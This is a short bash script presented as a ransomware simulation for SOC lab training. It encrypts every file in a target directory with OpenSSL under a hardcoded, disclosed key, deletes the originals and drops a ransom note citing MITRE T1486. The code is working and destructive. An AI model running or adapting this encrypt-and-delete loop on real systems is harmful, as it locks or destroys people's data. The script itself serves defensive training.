#!/bin/bash
#
# ransom_sim.sh
# Safe ransomware simulation script for SOC lab use ONLY.
# - Encrypts files in a target directory using OpenSSL AES-256-CBC
# - Deletes original files
# - Drops a ransom note
#

set -e

# ================== CONFIG ==================
TARGET_DIR="${1:-/home/ubuntu/victim_data}"   # Default target directory
PASSPHRASE="infected123"                      # Demo key (document this in report)
RANSOM_NOTE_NAME="README_RESTORE.txt"
# ============================================

if [ ! -d "$TARGET_DIR" ]; then
  echo "[!] Target directory does not exist: $TARGET_DIR"
  echo "    Create it first or run: ./generate_test_data.sh $TARGET_DIR"
  exit 1
fi

echo "[*] Starting ransomware simulation on: $TARGET_DIR"

for file in "$TARGET_DIR"/*; do
  if [ -f "$file" ]; then
    echo "[*] Encrypting: $file"
    openssl enc -aes-256-cbc -salt -in "$file" -out "$file.locked" -k "$PASSPHRASE"
    # Remove original file after successful encryption
    rm -f "$file"
  fi
done

echo "[*] Dropping ransom note..."

cat <<EOF > "$TARGET_DIR/$RANSOM_NOTE_NAME"
YOUR FILES HAVE BEEN ENCRYPTED!

This environment is part of a controlled SOC lab.
To restore files, use the provided decryption script and key.

Demo Decryption Key: $PASSPHRASE

MITRE ATT&CK Reference:
 - T1486: Data Encrypted for Impact
EOF

echo "[+] Ransomware simulation complete."
echo "[+] Current contents of $TARGET_DIR:"
ls -l "$TARGET_DIR"
